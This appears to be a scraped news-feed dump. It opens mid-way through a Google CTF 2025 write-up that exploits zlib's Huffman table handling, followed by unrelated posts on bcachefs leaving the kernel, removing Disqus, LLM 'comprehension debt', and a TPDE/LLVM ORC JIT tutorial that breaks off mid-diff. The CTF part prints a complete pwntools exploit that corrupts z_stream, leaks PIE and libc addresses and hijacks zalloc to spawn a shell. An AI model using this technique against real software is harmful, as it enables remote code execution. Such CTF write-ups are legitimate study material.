stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = len(overwrriten_infstream)
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(overwrriten_infstream[i], 8)
# STORED BLOCK =============================================================================&lt;/code&gt;&lt;p&gt;The final block performs the actual overflow to overwrite &lt;code&gt;z_stream infstream&lt;/code&gt;, letting us set its members arbitrarily.&lt;/p&gt;&lt;p&gt;Running the PoC confirms &lt;code&gt;z_stream infstream&lt;/code&gt; is overwritten.&lt;/p&gt;&lt;p&gt;The exploit is straightforward.&lt;/p&gt;&lt;code&gt;printf("Read receipt: %s\n", webz_state.infstream.msg);&lt;/code&gt;&lt;p&gt;First, by partially overwriting the &lt;code&gt;msg&lt;/code&gt; pointer in &lt;code&gt;infstream&lt;/code&gt; or setting it arbitrarily, we get arbitrary read.&lt;/p&gt;&lt;code&gt;local int updatewindow(z_streamp strm, const Bytef *end, unsigned copy) {
    struct inflate_state FAR *state;
    unsigned dist;

    state = (struct inflate_state FAR *)strm-&amp;gt;state;

    /* if it hasn't been done already, allocate space for the window */
    if (state-&amp;gt;window == Z_NULL) {
        state-&amp;gt;window = (unsigned char FAR *)
                        ZALLOC(strm, 1U &amp;lt;&amp;lt; state-&amp;gt;wbits,
                               sizeof(unsigned char));
        if (state-&amp;gt;window == Z_NULL) return 1;
    }
...&lt;/code&gt;&lt;code&gt;int ZEXPORT inflateEnd(z_streamp strm) {
    struct inflate_state FAR *state;
    if (inflateStateCheck(strm))
        return Z_STREAM_ERROR;
    state = (struct inflate_state FAR *)strm-&amp;gt;state;
    if (state-&amp;gt;window != Z_NULL) ZFREE(strm, state-&amp;gt;window);
    ZFREE(strm, strm-&amp;gt;state);
    strm-&amp;gt;state = Z_NULL;
    Tracev((stderr, "inflate: end\n"));
    return Z_OK;
}&lt;/code&gt;&lt;p&gt;Additionally, since &lt;code&gt;updatewindow&lt;/code&gt; and &lt;code&gt;inflateEnd&lt;/code&gt; call &lt;code&gt;zalloc&lt;/code&gt;/&lt;code&gt;zfree&lt;/code&gt;, control‑flow hijacking is easy.&lt;/p&gt;&lt;code&gt;import struct
from pwn import *

class BitStream:
    """LSB-first bit stream writer."""
    def __init__(self):
        self.bits = 0
        self.bit_count = 0
        self.data = bytearray()

    def write_bits(self, value, num_bits):
        for i in range(num_bits):
            bit = (value &amp;gt;&amp;gt; i) &amp;amp; 1
            if bit:
                self.bits |= (1 &amp;lt;&amp;lt; self.bit_count)
            self.bit_count += 1
            if self.bit_count == 8:
                self.data.append(self.bits)
                self.bits = 0
                self.bit_count = 0
    
    def bytebits(self):
        self.write_bits(0, 8 - (self.bit_count % 8))

    def get_bytes(self):
        if self.bit_count &amp;gt; 0:
            self.data.append(self.bits)
        return self.data

def generate_huffman_codes_from_lengths(lengths):
    max_len = 0
    for length in lengths:
        if length &amp;gt; max_len:
            max_len = length
    
    if max_len == 0:
        return {}

    bl_count = [0] * (max_len + 1)
    for length in lengths:
        if length &amp;gt; 0:
            bl_count[length] += 1
    
    code = 0
    next_code = [0] * (max_len + 1)
    for bits_len in range(1, max_len + 1):
        code = (code + bl_count[bits_len - 1]) &amp;lt;&amp;lt; 1
        next_code[bits_len] = code

    huffman_codes = {}
    for i, length in enumerate(lengths):
        if length != 0:
            rev_code = int(f'{next_code[length]:0{length}b}'[::-1], 2)
            huffman_codes[i] = (rev_code, length)
            next_code[length] += 1
    
    return huffman_codes

lbase = [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258]
lext = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0]
dbase = [1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577]
dext = [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13]
order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

def find_len_sym(length):
    for i in range(len(lbase)):
        if lbase[i] &amp;gt; length:
            i -= 1
            break
    base_len = lbase[i]
    extra_bits = lext[i]
    extra_val = length - base_len
    return 257 + i, extra_bits, extra_val

def find_dist_sym(distance):
    for i in range(len(dbase)):
        if dbase[i] &amp;gt; distance:
            i -= 1
            break
    base_dist = dbase[i]
    extra_bits = dext[i]
    extra_val = distance - base_dist
    return i, extra_bits, extra_val

def encode_lengths_rle(lengths):
    encoded = []
    i = 0
    while i &amp;lt; len(lengths):
        current_len = lengths[i]
        
        if current_len == 0:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == 0 and count &amp;lt; 138:
                count += 1
            if count &amp;gt;= 11:
                encoded.append((18, count - 11))
                i += count
                continue
            if count &amp;gt;= 3:
                encoded.append((17, count - 3))
                i += count
                continue

        if i &amp;gt; 0 and current_len == lengths[i - 1]:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == current_len and count &amp;lt; 6:
                count += 1
            if count &amp;gt;= 3:
                encoded.append((16, count - 3))
                i += count
                continue

        encoded.append((current_len, None))
        i += 1
    return encoded

def create_dynamic_deflate_payload(stream, is_last, symbol_stream, ll_lengths, dist_lengths):
    
    nlen = max(i for i, length in enumerate(ll_lengths) if length &amp;gt; 0) + 1
    ndist = max(i for i, length in enumerate(dist_lengths) if length &amp;gt; 0) + 1
    
    all_lengths = ll_lengths[:nlen] + dist_lengths[:ndist]
    rle_encoded_lengths = encode_lengths_rle(all_lengths)
    
    rle_symbols = [item[0] for item in rle_encoded_lengths]
    code_symbol_freqs = {sym: rle_symbols.count(sym) for sym in set(rle_symbols)}
    
    code_table_lengths = [0] * 19
    for sym in code_symbol_freqs:
        code_table_lengths[sym] = 7
    
    ncode = max(i for i, length in enumerate(order) if code_table_lengths[length] &amp;gt; 0) + 1

    code_huffman_table = generate_huffman_codes_from_lengths(code_table_lengths)

    stream.write_bits(is_last, 1) # BFINAL
    stream.write_bits(2, 2) # BTYPE (10 for dynamic)

    stream.write_bits(nlen - 257, 5)
    stream.write_bits(ndist - 1, 5)
    stream.write_bits(ncode - 4, 4)

    for i in range(ncode):
        stream.write_bits(code_table_lengths[order[i]], 3)
        
    for sym, extra_val in rle_encoded_lengths:
        code, length = code_huffman_table[sym]
        stream.write_bits(code, length)
        if sym == 16: stream.write_bits(extra_val, 2)
        elif sym == 17: stream.write_bits(extra_val, 3)
        elif sym == 18: stream.write_bits(extra_val, 7)


    ll_huffman_table = generate_huffman_codes_from_lengths(ll_lengths)
    dist_huffman_table = generate_huffman_codes_from_lengths(dist_lengths)
    
    for type, val in symbol_stream:
        if type == 'LIT':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'EOB':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'LD':
            l, d = val
            len_sym, len_extra_bits, len_extra_val = find_len_sym(l)
            dist_sym, dist_extra_bits, dist_extra_val = find_dist_sym(d)
            
            code, length = ll_huffman_table[len_sym]
            stream.write_bits(code, length)
            if len_extra_bits &amp;gt; 0:
                stream.write_bits(len_extra_val, len_extra_bits)
            
            code, length = dist_huffman_table[dist_sym]
            stream.write_bits(code, length)
            if dist_extra_bits &amp;gt; 0:
                stream.write_bits(dist_extra_val, dist_extra_bits)
        elif type == 'INVALID':
            code, length = val
            stream.write_bits(code, length)

def create_exploit_stream(stream):
    # STORED BLOCK ===============================================================================
    stream.write_bits(0, 1) # BFINAL
    stream.write_bits(0, 2) # BTYPE (0 for stored)
    stream.bytebits()
    stored_block_length = 0x200
    stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
    for i in range(0, stored_block_length):
        stream.write_bits(ord('X'), 8)
    # STORED BLOCK ===============================================================================

    # DYNAMIC BLOCK ==============================================================================
    symbol_stream = [ ('EOB', 256) ]

    ll_lengths = [0] * 286
    ll_lengths[256] = 3 # EOB

    dist_lengths = [0] * 30
    for i in range(17,30):
        dist_lengths[i] = 15

    create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
    # DYNAMIC BLOCK ==============================================================================

    # DYNAMIC BLOCK ==============================================================================
    symbol_stream = []

    symbol_stream.append(("INVALID", (8,10)))
    symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
    symbol_stream.append(("INVALID", (int('000'[::-1],2),3)))
    symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
    symbol_stream.append(('EOB', 256))
    ll_lengths = [0] * 286
    ll_lengths[256] = 10 # EOB
    ll_lengths[257] = 10 # Length 3
    ll_lengths[258] = 12 # Length 4

    dist_lengths = [0] * 30
    dist_lengths[17] = 3 # Distance ???

    create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
    # DYNAMIC BLOCK ==============================================================================

    # STORED BLOCK ===============================================================================
    stream.write_bits(0, 5) # dummy
    stream.write_bits(0, 1) # BFINAL
    stream.write_bits(0, 2) # BTYPE (0 for stored)
    stream.bytebits()
    stored_block_length = 0x10
    stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
    for i in range(0, stored_block_length):
        stream.write_bits(ord('C'), 8)
    # STORED BLOCK ===============================================================================

    # DYNAMIC BLOCK ==============================================================================
    symbol_stream = []
    symbol_stream.append(('LIT', 65))
    for i in range(0,0x2ce):
        symbol_stream.append(('LD', (10, 1)))
    for i in range(0,7):
        symbol_stream.append(('LIT', 65))
    symbol_stream.append(('EOB', 256))

    ll_lengths = [0] * 286
    ll_lengths[65] = 3  # 'A'
    ll_lengths[256] = 3 # EOB
    ll_lengths[264] = 3 # Length 10

    dist_lengths = [0] * 30
    dist_lengths[0] = 3 # Distance 1


    create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
    # DYNAMIC BLOCK ==============================================================================

def overwrite_infstream(stream, pay):
    # STORED BLOCK ===============================================================================
    overwrriten_infstream = pay

    stream.write_bits(1, 1) # BFINAL
    stream.write_bits(0, 2) # BTYPE (0 for stored)
    stream.bytebits()
    stored_block_length = len(overwrriten_infstream)
    stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
    for i in range(0, stored_block_length):
        stream.write_bits(overwrriten_infstream[i], 8)
    # STORED BLOCK =============================================================================

#p = process("./webz")
p = remote("webz.2025.ctfcompetition.com", 1337)

# POW =============================================================================
print(p.recv(1024))
answer = raw_input()
print(answer)
p.sendline(answer)
time.sleep(0.5)
# POW =============================================================================

def send_webz_payload(pay):
    NORMAL_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(5)
    p.send(p32(len(pay)+12))
    p.send(b"WEBZ"+NORMAL_AROUND_WIDTH_HEIGHT+b"\x00\x00\x00\x00"+pay)
    time.sleep(0.5)

# Leaking Pie Base By Partial-Overwrite =============================================================================
pay = b"x"*0x30 + p8(0x0)
stream = BitStream()
create_exploit_stream(stream)
overwrite_infstream(stream, pay)
send_webz_payload(stream.get_bytes())

p.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
pie_base = u64(p.recvn(6)+b'\x00\x00') - 0x1251b
print(f'pie_base = {hex(pie_base)}')
# Leaking Pie Base By Partial-Overwrite =============================================================================

# Leaking Libc Base By AAR =============================================================================
pay = b"x"*0x30 + p64(pie_base+0x12000) # free@got
stream = BitStream()
create_exploit_stream(stream)
overwrite_infstream(stream, pay)
send_webz_payload(stream.get_bytes())

p.recvuntil(b'receipt: ')
libc_base = u64(p.recvn(6)+b'\x00\x00') - 0xadd30
print(f'libc_base = {hex(libc_base)}')
# Leaking Libc Base By AAR =============================================================================

# Control Flow Hijacking By Overwriting zalloc =============================================================================
system_without_align_issue = libc_base+0x582d2
binsh = libc_base+0x1cb42f
jmp_to_zfree = pie_base+0x44da
dummy_memory = pie_base+0x13000
pay = b"\x00"*0x30 + p64(dummy_memory) + p64(dummy_memory) + p64(jmp_to_zfree) + p64(system_without_align_issue) + p64(binsh) * 30
stream = BitStream()
create_exploit_stream(stream)
overwrite_infstream(stream, pay)
send_webz_payload(stream.get_bytes())
# Control Flow Hijacking By Overwriting zalloc =============================================================================

p.interactive()&lt;/code&gt;&lt;p&gt;This is the final exploit. It successfully retrieves the flag.&lt;/p&gt;&lt;quote&gt;&lt;code&gt;CTF{MaybeReadyToTry0clickH1ntEstimateBandwidth}&lt;/code&gt;&lt;/quote&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://velog.io/@0range1337/CTF-Google-CTF-2025-webz-Exploiting-zlibs-Huffman-Code-Table-English"/><published>2025-09-30T06:50:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45423004</id><title>Bcachefs removed from the mainline kernel</title><updated>2025-09-30T16:43:08.432495+00:00</updated><content>&lt;doc fingerprint="7613591d18a776f4"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Bcachefs removed from the mainline kernel&lt;/head&gt;
    &lt;quote&gt;It's now a DKMS module, making the in-kernel code stale, so remove it to avoid any version confusion."&lt;/quote&gt;
    &lt;p&gt; Posted Sep 30, 2025 10:30 UTC (Tue) by patrakov (subscriber, #97174) [Link] Here I see the risk of the mainline kernel reverting the changes in other subsystems, because they might no longer have an in-tree user. Am I paranoid? What's the Bcachefs project's position on this risk if it is material - are they going to adapt, or go back to telling the user to compile their tree, as opposed to compiling just their module against an existing kernel? Posted Sep 30, 2025 12:44 UTC (Tue) by daeler (subscriber, #130460) [Link] (3 responses) Posted Sep 30, 2025 12:56 UTC (Tue) by corbet (editor, #1) [Link] Posted Sep 30, 2025 12:57 UTC (Tue) by pizza (subscriber, #46) [Link] (1 responses) Linus (just like everyone else with the Linux sources, can add or remove anything he wants. Of course, nobody else is forced to get "Linux" from him directly. Indeed, the vastly overwhelming majority of Linux users get their kernel from someone else, with features, drivers, and fixes not present in, or removed outright from, Linus's Linux. Posted Sep 30, 2025 13:37 UTC (Tue) by Lionel_Debroux (subscriber, #30014) [Link] Posted Sep 30, 2025 15:41 UTC (Tue) by DemiMarie (subscriber, #164188) [Link] (1 responses) The only exception I can think of is if recovery is handled almost entirely in userspace, which is not tied to the kernel release cycle. Posted Sep 30, 2025 15:45 UTC (Tue) by intelfx (subscriber, #130118) [Link] So if you're developing something that "does not belong upstream", the second you need an in-kernel API modified to suit your code (or, conversely, the second an in-kernel API is modified in such a way that harms your code) — you are SOL. &lt;head&gt;Risks&lt;/head&gt;&lt;head&gt;Decision process&lt;/head&gt;&lt;head/&gt; Yes, Linus can make that kind of decision. He doesn't just do it on his own, though; there was a long series of public and private discussions that led up to this one. &lt;head&gt;Decision process&lt;/head&gt;&lt;head&gt;Decision process&lt;/head&gt;&lt;head&gt;Decision process&lt;/head&gt;&lt;lb/&gt; The older a third-party kernel version is, the more it is likely to be missing both backports for security fixes, and vulnerabilities in code introduced in newer versions but not backported to the given third-party kernel (some vendors perform large amounts of backports to their franken-kernels).&lt;head&gt;I think this was the right thing&lt;/head&gt;&lt;head&gt;I think this was the right thing&lt;/head&gt;&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://lwn.net/Articles/1040120/"/><published>2025-09-30T07:52:16+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45423268</id><title>I’ve removed Disqus. It was making my blog worse</title><updated>2025-09-30T16:43:08.309230+00:00</updated><content>&lt;doc fingerprint="a2e43117070623c3"&gt;
  &lt;main&gt;
    &lt;head rend="h4"&gt;Intro&lt;/head&gt;
    &lt;p&gt;This will be a short and sweet post. As I’m not big on goodbyes.&lt;/p&gt;
    &lt;p&gt;Disqus started showing ads for their “free” tier comments system a few years back. At the time, the communication they sent out via email, seemed quite laid-back and had the tone of “don’t worry about it, it’s not a big thing”. Which in part lead me to almost forget it happened.&lt;/p&gt;
    &lt;p&gt;At the time, the disqus comments system looked quite smart and sleek. I remember thinking that the ads system will possibly look smart and sleek too. Which alleviated any worries I had at the time.&lt;/p&gt;
    &lt;p&gt;WELL&amp;amp;mldr;&amp;amp;mldr;.I’ve just seen the ads, and they look horrific!!!&lt;/p&gt;
    &lt;head rend="h4"&gt;Apologies&lt;/head&gt;
    &lt;p&gt;I have a Pihole set up, so ads are blocked on my home network. When I’m out of the house, my phone is connected to a Wireguard VPN which routes my data through my home internet, therefore - getting all the ad-blocking, Pihole goodness.&lt;/p&gt;
    &lt;p&gt;After years with Pi-hole, which now blocks over a million domains, I’ve become incredibly accustomed to a mostly ad-free web. Without realizing it, Iâd forgotten what the typical internet experience feels like.&lt;/p&gt;
    &lt;p&gt;I used to get a couple of emails from Disqus, letting me know that there’s a new comment on this blog. I haven’t had many of these emails recently, so I decided to disable my adblocker for a few minutes and check out the comments.&lt;/p&gt;
    &lt;p&gt;There were none, instead I was greeted by some horribly formatted and obviously scammy ads:&lt;/p&gt;
    &lt;p&gt;For the people who read this blog, I’m sorry.&lt;/p&gt;
    &lt;p&gt;I became “blind” to what the web is really like for most users. Iâve tried to keep this blog minimalist - a clean place to find answers. Those ads not only ruin that experience; they trample privacy too:&lt;/p&gt;
    &lt;p&gt;With this post, Iâve removed Disqus. It was making my blog worse, and frankly, they were profiting off my work and my visitor’s data. I want this blog to be a resource for devs and technologists, free not just in money, but in freedom from unwanted tracking and invasive ads.&lt;/p&gt;
    &lt;head rend="h4"&gt;Any Alternatives?&lt;/head&gt;
    &lt;p&gt;Iâm not entirely sure comments are needed here. There are other ways to reach me, for example; GitHub or Twitter/X. But having a place for discussion under each post can be valuable. If you have any recommendations for alternative commenting systems (especially those that respect privacy or are self-hosted), Iâd love to hear them! Please reach out if youâve found something that works well.&lt;/p&gt;
    &lt;p&gt;Thanks as always for reading - your trust matters to me.&lt;/p&gt;
    &lt;p&gt;Sorry again for the mess!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://ryansouthgate.com/goodbye-disqus/"/><published>2025-09-30T08:36:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45423917</id><title>Comprehension debt: A ticking time bomb of LLM-generated code</title><updated>2025-09-30T16:43:08.250310+00:00</updated><content>&lt;doc fingerprint="87c012014d34283f"&gt;
  &lt;main&gt;
    &lt;p&gt;An effect that’s being more and more widely reported is the increase in time it’s taking developers to modify or fix code that was generated by Large Language Models.&lt;/p&gt;
    &lt;p&gt;If you’ve worked on legacy systems that were written by other people, perhaps decades ago, you’ll recognise this phenomenon. Before we can safely change code, we first need to understand it – understand what it does, and also oftentimes why it does it the way it does. In that sense, this is nothing new.&lt;/p&gt;
    &lt;p&gt;What is new is the scale of the problem being created as lightning-speed code generators spew reams of unread code into millions of projects.&lt;/p&gt;
    &lt;p&gt;Teams that care about quality will take the time to review and understand (and more often than not, rework) LLM-generated code before it makes it into the repo. This slows things down, to the extent that any time saved using the LLM coding assistant is often canceled out by the downstream effort.&lt;/p&gt;
    &lt;p&gt;But some teams have opted for a different approach. They’re the ones checking in code nobody’s read, and that’s only been cursorily tested – if it’s been tested at all. And, evidently, there’s a lot of them.&lt;/p&gt;
    &lt;p&gt;When teams produce code faster than they can understand it, it creates what I’ve been calling “comprehension debt”. If the software gets used, then the odds are high that at some point that generated code will need to change. The “A.I.” boosters will say “We can just get the tool to do that”. And that might work maybe 70% of the time.&lt;/p&gt;
    &lt;p&gt;But those of us who’ve experimented a lot with using LLMs for code generation and modification know that there will be times when the tool just won’t be able to do it.&lt;/p&gt;
    &lt;p&gt;“Doom loops”, when we go round and round in circles trying to get an LLM, or a bunch of different LLMs, to fix a problem that it just doesn’t seem to be able to, are an everyday experience using this technology. Anyone claiming it doesn’t happen to them has either been extremely lucky, or is fibbing.&lt;/p&gt;
    &lt;p&gt;It’s pretty much guaranteed that there will be many times when we have to edit the code ourselves. The “comprehension debt” is the extra time it’s going to take us to understand it first.&lt;/p&gt;
    &lt;p&gt;And we’re sitting on a rapidly growing mountain of it.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://codemanship.wordpress.com/2025/09/30/comprehension-debt-the-ticking-time-bomb-of-llm-generated-code/"/><published>2025-09-30T10:37:39+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45423994</id><title>Using the TPDE Codegen Back End in LLVM Orc</title><updated>2025-09-30T16:43:08.136385+00:00</updated><content>&lt;doc fingerprint="263bd3580c0d17d8"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Using the TPDE Codegen Backend in LLVM ORC&lt;/head&gt;
    &lt;p&gt;TPDE is a single-pass compiler backend for LLVM that was open-sourced earlier this year by researchers at TUM. The comprehensive documentation walks you through integrating TPDE into custom builds of Clang and Flang. Currently, it supports LLVM 19 and LLVM 20 release versions.&lt;/p&gt;
    &lt;head rend="h3"&gt;Integration in LLVM ORC JIT&lt;/head&gt;
    &lt;p&gt;TPDE’s primary strength lies in delivering low-latency code generation while maintaining reasonable &lt;code&gt;-O0&lt;/code&gt; code quality — making it an ideal choice for a baseline JIT compiler. LLVM’s On-Request Compilation (ORC) framework provides a set of libraries for building JIT compilers for LLVM IR. While ORC uses LLVM’s built-in backends by default, its flexible architecture makes it straightforward to swap in TPDE instead!&lt;/p&gt;
    &lt;p&gt;Let’s say we use the &lt;code&gt;LLJITBuilder&lt;/code&gt; interface to instantiate an off-the-shelf JIT:&lt;/p&gt;
    &lt;code&gt;ExitOnError ExitOnErr;
auto Builder = LLJITBuilder();
std::unique_ptr&amp;lt;LLJIT&amp;gt; JIT = ExitOnErr(Builder.create());
&lt;/code&gt;
    &lt;p&gt;The builder offers several extension points to customize the JIT instance it creates. To integrate TPDE, we’ll override the &lt;code&gt;CreateCompileFunction&lt;/code&gt; member, which defines how LLVM IR gets compiled into machine code:&lt;/p&gt;
    &lt;code&gt;Builder.CreateCompileFunction = [](JITTargetMachineBuilder JTMB)
    -&amp;gt; Expected&amp;lt;std::unique_ptr&amp;lt;IRCompileLayer::IRCompiler&amp;gt;&amp;gt; {
  return std::make_unique&amp;lt;TPDECompiler&amp;gt;(JTMB);
};
&lt;/code&gt;
    &lt;p&gt;To use TPDE in this context, we need to wrap it in a class that’s compatible with ORC’s interface:&lt;/p&gt;
    &lt;code&gt;class TPDECompiler : public IRCompileLayer::IRCompiler {
public:
  TPDECompiler(JITTargetMachineBuilder JTMB)
      : IRCompiler(irManglingOptionsFromTargetOptions(JTMB.getOptions())) {
    Compiler = tpde_llvm::LLVMCompiler::create(JTMB.getTargetTriple());
    assert(Compiler != nullptr &amp;amp;&amp;amp; "Unknown architecture");
  }

  Expected&amp;lt;std::unique_ptr&amp;lt;MemoryBuffer&amp;gt;&amp;gt; operator()(Module &amp;amp;M) override;

private:
  std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
  std::vector&amp;lt;std::unique_ptr&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;&amp;gt; Buffers;
};
&lt;/code&gt;
    &lt;p&gt;In the constructor, we initialize TPDE with a target triple (like &lt;code&gt;x86_64-pc-linux-gnu&lt;/code&gt;). TPDE currently works on ELF-based systems and supports both 64-bit Intel and ARM architectures (&lt;code&gt;x86_64&lt;/code&gt; and &lt;code&gt;aarch64&lt;/code&gt;). For now let’s assume that’s all we need. Now let’s implement the actual wrapper code:&lt;/p&gt;
    &lt;code&gt;Expected&amp;lt;std::unique_ptr&amp;lt;MemoryBuffer&amp;gt;&amp;gt; TPDECompiler::operator()(Module &amp;amp;M) {
  Buffers.push_back(std::make_unique&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;());
  std::vector&amp;lt;uint8_t&amp;gt; &amp;amp;B = *Buffers.back();

  if (!Compiler-&amp;gt;compile_to_elf(M, B)) {
    std::string Msg;
    raw_string_ostream(Msg) &amp;lt;&amp;lt; "TPDE failed to compile: " &amp;lt;&amp;lt; M.getName();
    return createStringError(std::move(Msg), inconvertibleErrorCode());
  }

  StringRef BufferRef{reinterpret_cast&amp;lt;char *&amp;gt;(B.data()), B.size()};
  return MemoryBuffer::getMemBuffer(BufferRef, "", false);
}
&lt;/code&gt;
    &lt;p&gt;Here’s what’s happening: we create a new buffer &lt;code&gt;B&lt;/code&gt; to store the compiled binary code, then pass both the buffer and the module &lt;code&gt;M&lt;/code&gt; to TPDE for compilation. If TPDE fails, we bail out with an error. On success, we wrap the result in a &lt;code&gt;MemoryBuffer&lt;/code&gt; and return it. (Note: LLVM still uses &lt;code&gt;char&lt;/code&gt; pointers for binary buffers and the three-way definition of &lt;code&gt;char&lt;/code&gt; in the C Standard falls on our feet sometimes, but it’s difficult to change in a mature codebase like LLVM.)&lt;/p&gt;
    &lt;p&gt;For the basic integration this is it! No need to patch LLVM — this works with official release versions. We can compile simple LLVM IR code already:&lt;/p&gt;
    &lt;code&gt;&amp;gt; cat 01-basic.ll 
; ModuleID = 'test.ll'
source_filename = "test.ll"

define i32 @main() {
entry:
  %1 = call i32 @custom_entry()
  %2 = sub i32 %1, 123
  ret i32 %2
}

define i32 @custom_entry() {
entry:
  ret i32 123
}
&lt;/code&gt;
    &lt;p&gt;I’ve created a complete working demo on GitHub that you can try out. The code in the repo handles a few more details that we’ll explore shortly. Here’s what the output looks like:&lt;/p&gt;
    &lt;code&gt;&amp;gt; ./tpde-orc 01-basic.ll 
Loaded module: 01-basic.ll
Executing main()
Program returned: 0

&amp;gt; ./tpde-orc 01-basic.ll --entrypoint custom_entry
Loaded module: 01-basic.ll
Executing custom_entry()
Program returned: 123
&lt;/code&gt;
    &lt;p&gt;We can already see a 4x speedup with TPDE compared to built-in LLVM codegen for 100 repetitions with a large self-contained module that was generated with csmith:&lt;/p&gt;
    &lt;code&gt;&amp;gt; ./build/tpde-orc --par 1 tpde-orc/03-csmith-tpde.ll
...
Compile-time was: 2200 ms

&amp;gt; ./build/tpde-orc --par 1 tpde-orc/03-csmith-tpde.ll --llvm
...
Compile-time was: 8820 ms
&lt;/code&gt;
    &lt;head rend="h3"&gt;LLJITBuilder has a Catch&lt;/head&gt;
    &lt;p&gt;While &lt;code&gt;LLJITBuilder&lt;/code&gt; is convenient, it comes with a minor trade-off. The interface incorporates standard LLVM components including &lt;code&gt;TargetRegistry&lt;/code&gt;, which is perfectly reasonable for most use cases. However, this creates a dependency we might not want: the built-in LLVM target backend must be initialized first via &lt;code&gt;InitializeNativeTarget()&lt;/code&gt;. This means we still need to ship the LLVM backend, even though TPDE could theoretically replace it entirely.&lt;/p&gt;
    &lt;p&gt;If you want to avoid this dependency, you’ll need to set up your ORC JIT manually. For inspiration on this approach, check out how the &lt;code&gt;tpde-lli&lt;/code&gt; tool implements it. Before diving into that rabbit hole though, let’s explore another important aspect!&lt;/p&gt;
    &lt;head rend="h3"&gt;Implementing a LLVM Fallback&lt;/head&gt;
    &lt;p&gt;One reason why TPDE is so fast and compact is that it focusses on the most common use cases rather than covering every edge case in the LLVM instruction set. The documentation provides this guideline:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Code generated by Clang (-O0/-O1) will typically compile; -O2 and higher will typically fail due to unsupported vector operations.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;When your code includes advanced features like vector operations or non-trivial floating-point types, TPDE won’t be able to handle it. In these cases, we need a fallback to LLVM. Since this scenario is quite common in real-world applications, most tools will include both backends (and we can keep using &lt;code&gt;LLJITBuilder&lt;/code&gt;). Implementing the fallback is straightforward using ORC’s CompileUtils:&lt;/p&gt;
    &lt;code&gt;@@ -29,7 +29,8 @@ static cl::opt&amp;lt;std::string&amp;gt; EntryPoint("entrypoint",
 class TPDECompiler : public IRCompileLayer::IRCompiler {
 public:
   TPDECompiler(JITTargetMachineBuilder JTMB)
-      : IRCompiler(irManglingOptionsFromTargetOptions(JTMB.getOptions())) {
+      : IRCompiler(irManglingOptionsFromTargetOptions(JTMB.getOptions())),
+        JTMB(std::move(JTMB)) {
     Compiler = tpde_llvm::LLVMCompiler::create(JTMB.getTargetTriple());
     assert(Compiler != nullptr &amp;amp;&amp;amp; "Unknown architecture");
   }
@@ -37,9 +38,9 @@ Expected&amp;lt;std::unique_ptr&amp;lt;MemoryBuffer&amp;gt;&amp;gt; TPDECompiler::operator()(Module &amp;amp;M) {
   std::vector&amp;lt;uint8_t&amp;gt; &amp;amp;B = *Buffers.back();
 
   if (!Compiler-&amp;gt;compile_to_elf(M, B)) {
-    std::string Msg;
-    raw_string_ostream(Msg) &amp;lt;&amp;lt; "TPDE failed to compile: " &amp;lt;&amp;lt; M.getName();
-    return createStringError(std::move(Msg), inconvertibleErrorCode());
+    errs() &amp;lt;&amp;lt; "Falling back to LLVM for module: " &amp;lt;&amp;lt; M.getName() &amp;lt;&amp;lt; "\n";
+    auto TM = ExitOnErr(JTMB.createTargetMachine());
+    return SimpleCompiler(*TM)(M);
   }
 
   StringRef BufferRef{reinterpret_cast&amp;lt;char *&amp;gt;(B.data()), B.size()};
@@ -50,6 +51,7 @@ public:
 private:
